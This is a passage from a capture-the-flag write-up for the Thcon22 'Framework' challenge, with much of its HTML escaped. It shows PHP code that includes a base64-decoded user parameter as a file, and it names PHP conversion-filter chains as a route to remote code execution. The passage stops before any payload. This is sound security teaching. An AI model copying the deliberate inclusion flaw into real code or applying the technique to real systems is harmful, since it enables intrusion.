&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;	&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;lt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;meta &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;charset=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;utf-8&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;	&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;lt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;meta &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;name=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;viewport&amp;amp;quot; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;content=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;width=device-width, initial-scale=1&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;	&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;lt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;title&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;Framework&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;lt;&amp;#x2F;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;title&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;lt;&amp;#x2F;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;head&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;lt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;body&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;	&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;lt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;div &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;class=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;headers&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;		&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;lt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;div &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;class=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;inner_headers&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;			&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;lt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;div &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;class=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;logo_c&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;				&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;lt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;h1&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;Thcon22&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;lt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;span&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;Framework&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;lt;&amp;#x2F;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;span&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;&amp;amp;lt;&amp;#x2F;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;h1&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;			&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;lt;&amp;#x2F;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;div&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;				&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;lt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;ul &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;class=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;nav&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;	&amp;amp;lt;?php
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;	createHeaders(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;array&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;change_profile&amp;amp;#39; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;=&amp;amp;gt; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;Edit&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;view_profile&amp;amp;#39; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;=&amp;amp;gt; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;View&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;), $safe_handler);
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;	&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;?&amp;amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;			&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;lt;&amp;#x2F;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;ul&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;		&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;lt;&amp;#x2F;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;div&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;	&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;lt;&amp;#x2F;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;div&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;	&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;lt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;div &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;class=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;blank_space&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;&amp;amp;lt;&amp;#x2F;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;div&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;	&amp;amp;lt;?php
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;	&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;if&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;isset&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;($_GET[&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;page&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;]) &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;amp;&amp;amp;amp; !&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;empty&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;($_GET[&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;page&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;]) &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;amp;&amp;amp;amp; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;isset&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;($_GET[&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;pHash&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;]) &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;amp;&amp;amp;amp; !&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;empty&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;($_GET[&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;pHash&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;]))
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;	{
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;		$page &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;$_GET[&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;page&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;];
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;		$hash &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;$_GET[&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;pHash&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;];
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;		&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;if&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;($safe_handler-&amp;amp;gt;handle($page, $hash))
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;		{
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;			&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;include&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;base64_decode&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;($page) &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;. &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;.php&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;);
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;		}
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;		&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;else
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;		{
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;			&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;echo &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;&amp;amp;lt;h2&amp;amp;gt;Integrity verification failed...&amp;amp;lt;&amp;#x2F;h2&amp;amp;gt;&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;		}
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;	}
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;	&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;else&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;{
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;	&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;?&amp;amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;	&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;lt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;h1&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;Welcome to the profile editor !&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;lt;&amp;#x2F;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;h1&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;	&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;lt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;p&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;Here you can create and edit your profile.&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;lt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;br&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt; A card will be created for your Thcon22 participation.&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;lt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;br&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt; We hope you will like the rendering !&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;lt;&amp;#x2F;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;p&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;	&amp;amp;lt;?php
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;	}
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;	&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;?&amp;amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;lt;&amp;#x2F;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;body&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;lt;&amp;#x2F;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;html&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;Now we know for certain how files are loaded - &amp;lt;code&amp;gt;include(base64_decode($page) . &amp;#x27;.php&amp;#x27;)&amp;lt;&amp;#x2F;code&amp;gt;. We need to find a way to load &amp;lt;code&amp;gt;&amp;#x2F;flag.txt&amp;lt;&amp;#x2F;code&amp;gt; even though &amp;lt;code&amp;gt;.php&amp;lt;&amp;#x2F;code&amp;gt; is always appended.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;getting-the-flag&amp;quot;&amp;gt;Getting the Flag&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;When I participated in hxp CTF 2021 we faced &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;lewin.co.il&amp;#x2F;winning-the-impossible-race-an-unintended-solution-for-includers-revenge-counter-hxp-2021&amp;#x2F;&amp;quot;&amp;gt;a similar problem&amp;lt;&amp;#x2F;a&amp;gt;, and I remember &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;gist.github.com&amp;#x2F;loknop&amp;#x2F;b27422d355ea1fd0d90d6dbc1e278d4d&amp;quot;&amp;gt;&amp;lt;code&amp;gt;loknop&amp;lt;&amp;#x2F;code&amp;gt; developed a creative solution&amp;lt;&amp;#x2F;a&amp;gt; using only &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;www.php.net&amp;#x2F;manual&amp;#x2F;en&amp;#x2F;filters.convert.php&amp;quot;&amp;gt;PHP conversion filters&amp;lt;&amp;#x2F;a&amp;gt; passed to &amp;lt;code&amp;gt;include()&amp;lt;&amp;#x2F;code&amp;gt; to achieve &amp;lt;strong&amp;gt;RCE&amp;lt;&amp;#x2F;strong&amp;gt; (which is much more than what we need here - reading file content, but will work!). I 